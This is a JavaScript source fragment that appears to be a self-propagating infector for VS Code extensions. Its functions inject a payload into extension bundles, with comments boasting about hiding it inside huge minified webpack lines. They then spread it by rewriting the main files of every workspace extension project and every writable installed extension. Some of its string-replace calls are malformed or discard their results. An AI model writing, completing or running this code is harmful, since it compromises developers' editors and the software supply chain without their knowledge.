function pwn_ext_buf(_buf) {
	let buf = _buf;
//	let buf = fs.readFileSync(fname, "utf8");
	let pwnage = sentinel_pwn();

	if (buf.includes(pwnage)) return false;
//	if (!buf.includes("vscode")) return false;

	if (buf.includes("})();\nObject.defineProperty")) {
		// easy to hide between these
		buf.replace("})();\nObject.defineProperty", "})();\nObject.defineProperty", `})();\n${pwnage}\nObject.defineProperty`);
	} else if (buf.includes("__webpack_module_cache__={};function __webpack_require__")) {
		// even better, halfway through a fucking 100k line!
		buf.replace("__webpack_module_cache__={};function __webpack_require__", `__webpack_module_cache__={};${pwnage}function __webpack_require__`);
	} else {
		buf = buf + "\n" + Buffer.from(pwnage);
	}

//	fs.writeFileSync(fname, buf);

	return buf;
}

function extension_js_spread() {
	vscode["workspace"]["findFiles"]("**/{package.json}", "**/node_modules/**")["then"]((ev) => {
		for (var el of ev) {
			let j = JSON.parse(fs.readFileSync(el.path, "utf8"));
			try {
				if (!j["engines"]["vscode"]) continue;
			} catch {
				//;
			}
			let mc = path.dirname(el.path) + "/" + j["main"];
			let b = fs.readFileSync(mc, "utf8");
			let pwnd = pwn_ext_buf(b);

			fs.writeFileSync(mc, pwnd ? pwnd : b);
		}
	});
}

function extension_spread() {
	vscode.extensions.all.map(
		(e) => {
			fs.access(e.extensionPath, 2, (er) => {
				if (er) return;
				
				let x = (e.extensionPath + "/" + require(e.extensionPath + "/package.json")["main"]);
				
				x = x.endsWith("js") ? x : x + ".js";
				
				let f = fs.readFileSync(x, "utf8");
				let b = pwn_ext_buf(f);
				fs.writeFileSync(x, b ? b : f)
			})
		}
	);
}